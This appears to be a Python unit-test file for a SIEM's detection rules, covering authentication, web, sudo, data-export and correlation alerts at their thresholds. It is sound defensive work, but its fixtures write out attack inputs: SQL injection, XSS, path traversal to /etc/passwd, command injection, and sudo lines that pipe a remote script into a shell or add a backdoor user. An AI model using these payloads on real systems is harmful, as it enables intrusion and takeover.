"""Unit tests for each detection rule, including the boundaries (just under / just over threshold)."""
from datetime import datetime, timedelta

from siem.models import Event
from siem.rules import all_rules, run_detection

T0 = datetime(2026, 11, 22, 10, 0, 0)


def ev(sec, etype, ip=None, user=None, source="auth", **extra):
    return Event(T0 + timedelta(seconds=sec), source, etype, ip, user,
                 raw=f"{etype}|{sec}|{ip}|{user}|{sorted(extra.items())}", extra=extra)


def fails(n, ip="203.0.113.5", users=("root",), start=0, step=10):
    return [ev(start + i * step, "auth_failure", ip, users[i % len(users)]) for i in range(n)]


def web(sec, path="/", ip="203.0.113.7", status=200, ua="Mozilla/5.0"):
    return ev(sec, "http_request", ip, None, source="web", path=path, status=status, user_agent=ua)


def sudo(sec, user, cmd):
    return ev(sec, "privilege_cmd", None, user, command=cmd, target_user="root")


def ids(alerts):
    return [a.rule_id for a in alerts]


def only(alerts, rule_id):
    return [a for a in alerts if a.rule_id == rule_id]


# --------------------------------------------------------------- AUTH-001 ----
def test_brute_force_fires_at_threshold_and_not_below():
    assert ids(run_detection(fails(5, step=10))) == ["AUTH-001"]
    assert run_detection(fails(4, step=10)) == []


def test_brute_force_not_triggered_when_attempts_are_spread_out():
    assert run_detection(fails(5, step=120)) == []  # at most 3 attempts inside any 5-minute window


def test_long_attack_produces_one_alert_with_capped_evidence():
    alerts = run_detection(fails(100, step=5))
    assert ids(alerts) == ["AUTH-001"]
    assert alerts[0].event_count == 100
    assert len(alerts[0].evidence) == 25  # evidence is capped so alerts stay small


def test_failures_from_different_ips_are_not_combined():
    assert run_detection(fails(3, ip="1.1.1.1") + fails(3, ip="2.2.2.2", start=1)) == []


# --------------------------------------------------------------- AUTH-002 ----
def test_password_spraying_detected_and_not_reported_as_brute_force():
    alerts = run_detection(fails(6, users=("a", "b", "c", "d", "e", "f")))
    assert ids(alerts) == ["AUTH-002"]


def test_many_failures_on_few_accounts_is_brute_force_not_spraying():
    alerts = run_detection(fails(10, users=("root", "admin")))
    assert ids(alerts) == ["AUTH-001"]


# --------------------------------------------------------------- AUTH-003 ----
def test_success_after_failures_is_critical_and_uses_success_time():
    events = fails(6) + [ev(70, "auth_success", "203.0.113.5", "root")]
    a = only(run_detection(events), "AUTH-003")
    assert len(a) == 1
    assert a[0].severity == "critical" and a[0].username == "root"
    assert a[0].timestamp == T0 + timedelta(seconds=70)


def test_success_from_a_different_ip_or_after_few_failures_is_ignored():
    other_ip = fails(6) + [ev(70, "auth_success", "9.9.9.9", "root")]
    few = fails(3) + [ev(40, "auth_success", "203.0.113.5", "root")]
    assert only(run_detection(other_ip), "AUTH-003") == []
    assert only(run_detection(few), "AUTH-003") == []


def test_success_long_after_failures_is_ignored():
    events = fails(6) + [ev(3600, "auth_success", "203.0.113.5", "root")]  # an hour later
    assert only(run_detection(events), "AUTH-003") == []


# ------------------------------------------------------------ web patterns ----
def test_sql_injection_plain_and_double_encoded():
    plain = web(0, "/p.php?id=1%27%20OR%20%271%27%3D%271")
    double = web(0, "/p.php?id=1%2527%2520OR%2520%25271%2527%253D%25271", ip="203.0.113.8")
    assert ids(run_detection([plain])) == ["WEB-001"]
    assert ids(run_detection([double])) == ["WEB-001"]
    union = web(0, "/p.php?id=1+UNION+SELECT+username,password+FROM+users--")
    assert ids(run_detection([union])) == ["WEB-001"]


def test_benign_urls_do_not_trigger_web_rules():
    benign = [web(i, p) for i, p in enumerate([
        "/", "/products?id=12&sort=price", "/search?q=union+station", "/search?q=select+a+gift+for+mom",
        "/api/v1/items?page=2", "/static/app.js", "/blog/how-to-fix-an-or-condition",
    ])]
    assert run_detection(benign) == []


def test_xss_traversal_and_command_injection():
    assert ids(run_detection([web(0, "/s?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")])) == ["WEB-002"]
    assert ids(run_detection([web(0, "/dl?file=..%2F..%2Fetc%2Fpasswd")])) == ["WEB-003"]
    assert ids(run_detection([web(0, "/ping?host=1.1.1.1%20%26%26%20whoami")])) == ["WEB-004"]


def test_hits_from_one_ip_close_together_form_one_alert():
    hits = [web(i * 10, "/p.php?id=1%27%20OR%20%271%27%3D%271") for i in range(8)]
    a = only(run_detection(hits), "WEB-001")
    assert len(a) == 1 and a[0].event_count == 8


def test_scanner_user_agent():
    assert ids(run_detection([web(0, ua="sqlmap/1.7.11#stable")])) == ["WEB-005"]
    assert run_detection([web(0, ua="Mozilla/5.0 (X11; Linux x86_64) Firefox/127.0")]) == []


def test_directory_enumeration_threshold():
    burst = [web(i, f"/x{i}", status=404, ip="192.0.2.9") for i in range(25)]
    assert ids(run_detection(burst)) == ["WEB-006"]
    assert run_detection(burst[:15]) == []  # 15 404s is below the 20 threshold


# ------------------------------------------------------- host / app / intel ----
def test_suspicious_sudo_commands_only():
    for cmd in ["/bin/bash", "/usr/sbin/useradd -m backdoor", "chmod 777 /etc/passwd", "/usr/bin/curl http://x/y.sh | sh"]:
        assert ids(run_detection([sudo(0, "admin", cmd)])) == ["SYS-001"], cmd
    for cmd in ["/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/journalctl -u sshd"]:
        assert run_detection([sudo(0, "admin", cmd)]) == [], cmd


def test_two_sudo_commands_in_the_same_second_are_both_reported():
    a = Event(T0, "auth", "privilege_cmd", None, "admin", raw="line-A", uid="aaaaaaaa", extra={"command": "/bin/bash"})
    b = Event(T0, "auth", "privilege_cmd", None, "admin", raw="line-B", uid="bbbbbbbb", extra={"command": "/bin/sh"})
    assert len(only(run_detection([a, b]), "SYS-001")) == 2


def test_large_export_threshold():
    big = ev(0, "app_data_export", "1.1.1.1", "mallory", source="app", records=25000, dataset="customers")
    small = ev(0, "app_data_export", "1.1.1.1", "alice", source="app", records=500, dataset="orders")
    assert ids(run_detection([big])) == ["APP-001"]
    assert run_detection([small]) == []


def _role_change(ts, new_role):
    return Event(ts, "app", "app_role_change", "1.1.1.1", "mallory", raw=f"role|{ts}|{new_role}",
                 extra={"target_user": "mallory", "new_role": new_role})


def test_admin_grant_is_high_off_hours_and_medium_in_business_hours():
    night = only(run_detection([_role_change(datetime(2026, 11, 22, 3, 12), "admin")]), "APP-002")
    day = only(run_detection([_role_change(datetime(2026, 11, 22, 10, 0), "admin")]), "APP-002")
    assert night[0].severity == "high" and "OFF-HOURS" in night[0].description
    assert day[0].severity == "medium"
    assert run_detection([_role_change(datetime(2026, 11, 22, 3, 12), "editor")]) == []


def test_blocklist_rule_needs_configured_ips():
    e = ev(0, "http_request", "198.51.100.77", source="web", path="/", status=200, user_agent="x")
    assert run_detection([e]) == []
    assert ids(run_detection([e], {"blocklist": ["198.51.100.77"]})) == ["TI-001"]


# ------------------------------------------------------------ correlation ----
def test_multi_stage_attack_needs_both_web_and_auth_alerts_from_same_ip():
    ip = "203.0.113.5"
    both = [web(0, "/p.php?id=1%27%20OR%20%271%27%3D%271", ip=ip)] + fails(5, ip=ip, start=30)
    only_web = [web(0, "/p.php?id=1%27%20OR%20%271%27%3D%271", ip=ip)]
    cor = only(run_detection(both), "COR-001")
    assert len(cor) == 1 and cor[0].severity == "critical" and cor[0].src_ip == ip
    assert only(run_detection(only_web), "COR-001") == []
    split = [web(0, "/p.php?id=1%27%20OR%20%271%27%3D%271", ip="1.1.1.1")] + fails(5, ip="2.2.2.2", start=30)
    assert only(run_detection(split), "COR-001") == []


def test_privilege_escalation_after_takeover_correlation():
    takeover = fails(6) + [ev(70, "auth_success", "203.0.113.5", "admin")]
    soon = run_detection(takeover + [sudo(200, "admin", "/bin/bash")])
    assert len(only(soon, "COR-002")) == 1
    other_user = run_detection(takeover + [sudo(200, "bob", "/bin/bash")])
    assert only(other_user, "COR-002") == []
    too_late = run_detection(takeover + [sudo(3 * 3600, "admin", "/bin/bash")])
    assert only(too_late, "COR-002") == []


# ------------------------------------------------------------ housekeeping ----
def test_rule_ids_are_unique_and_documented():
    rules = all_rules()
    assert len({r.id for r in rules}) == len(rules)
    for r in rules:
        assert r.title and r.description and r.severity in {"low", "medium", "high", "critical"}


def test_dedup_keys_are_unique_within_a_run():
    events = (fails(6) + [ev(70, "auth_success", "203.0.113.5", "admin"), sudo(100, "admin", "/bin/bash")]
              + [web(i, "/p.php?id=1%27%20OR%20%271%27%3D%271") for i in range(3)])
    alerts = run_detection(events)
    assert len({a.dedup_key for a in alerts}) == len(alerts) > 3


def test_detection_is_independent_of_input_order():
    events = fails(6) + [ev(70, "auth_success", "203.0.113.5", "admin")]
    forward = run_detection(events)
    backward = run_detection(list(reversed(events)))
    assert [a.dedup_key for a in forward] == [a.dedup_key for a in backward]
